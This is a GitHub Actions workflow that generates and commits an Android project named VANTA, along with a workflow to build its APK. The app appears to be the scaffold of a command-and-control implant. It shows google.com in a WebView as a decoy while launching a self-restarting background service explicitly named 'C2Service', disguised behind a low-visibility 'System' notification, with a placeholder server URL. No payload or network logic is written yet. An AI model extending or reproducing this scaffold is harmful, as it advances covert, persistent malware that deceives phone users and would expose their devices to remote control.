name: Setup Project Files
on: workflow_dispatch

jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Create directory structure and files
        run: |
          mkdir -p app/src/main/java/com/vanta/core
          mkdir -p .github/workflows
          
          # 1. app/build.gradle
          cat > app/build.gradle << 'EOF'
          plugins { id 'com.android.application' }
          android {
              namespace 'com.vanta.core'
              compileSdk 34
              defaultConfig { applicationId "com.vanta.core"; minSdk 26; targetSdk 34; versionCode 1; versionName "1.0" }
              compileOptions { sourceCompatibility JavaVersion.VERSION_17; targetCompatibility JavaVersion.VERSION_17 }
          }
          EOF
          
          # 2. AndroidManifest.xml
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
              <application android:label="VANTA" android:allowBackup="true" android:theme="@android:style/Theme.DeviceDefault">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <service android:name=".C2Service" android:exported="false" android:foregroundServiceType="dataSync"/>
              </application>
          </manifest>
          EOF

          # 3. Config.java
          cat > app/src/main/java/com/vanta/core/Config.java << 'EOF'
          package com.vanta.core;
          public class Config {
              public static final String SERVER = "https://example.com";
          }
          EOF

          # 4. MainActivity.java
          cat > app/src/main/java/com/vanta/core/MainActivity.java << 'EOF'
          package com.vanta.core;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Build;
          import android.os.Bundle;
          import android.webkit.WebView;
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle b) {
                  super.onCreate(b);
                  WebView w = new WebView(this);
                  w.getSettings().setJavaScriptEnabled(true);
                  w.loadUrl("https://www.google.com");
                  setContentView(w);
                  Intent i = new Intent(this, C2Service.class);
                  if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                  else startService(i);
              }
          }
          EOF

          # 5. C2Service.java
          cat > app/src/main/java/com/vanta/core/C2Service.java << 'EOF'
          package com.vanta.core;
          import android.app.*;
          import android.content.Intent;
          import android.os.Build;
          import android.os.IBinder;
          public class C2Service extends Service {
              @Override
              public int onStartCommand(Intent i, int f, int s) {
                  if (Build.VERSION.SDK_INT >= 26) {
                      NotificationChannel ch = new NotificationChannel("c2", "Service", NotificationManager.IMPORTANCE_MIN);
                      getSystemService(NotificationManager.class).createNotificationChannel(ch);
                  }
                  Notification n;
                  if (Build.VERSION.SDK_INT >= 26)
                      n = new Notification.Builder(this, "c2").setContentTitle("System").setSmallIcon(android.R.drawable.stat_notify_sync).build();
                  else
                      n = new Notification.Builder(this).setContentTitle("System").setSmallIcon(android.R.drawable.stat_notify_sync).build();
                  startForeground(1, n);
                  return START_STICKY;
              }
              @Override public IBinder onBind(Intent i) { return null; }
          }
          EOF
          
          # 6. build.yml (ملف البناء)
          cat > .github/workflows/build.yml << 'EOF'
          name: Build APK
          on: workflow_dispatch
          jobs:
            build:
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@v4
                - uses: actions/setup-java@v4
                  with: { distribution: temurin, java-version: 17 }
                - uses: gradle/actions/setup-gradle@v4
                  with: { gradle-version: 8.7 }
                - run: gradle assembleDebug --no-daemon
                - uses: actions/upload-artifact@v4
                  with: { name: vanta-apk, path: app/build/outputs/apk/debug/*.apk }
          EOF

      - name: Commit and push files
        run: |
          git config user.name "GitHub Action"
          git config user.email "action@github.com"
          git add .
          git commit -m "Setup VANTA project files"
          git push
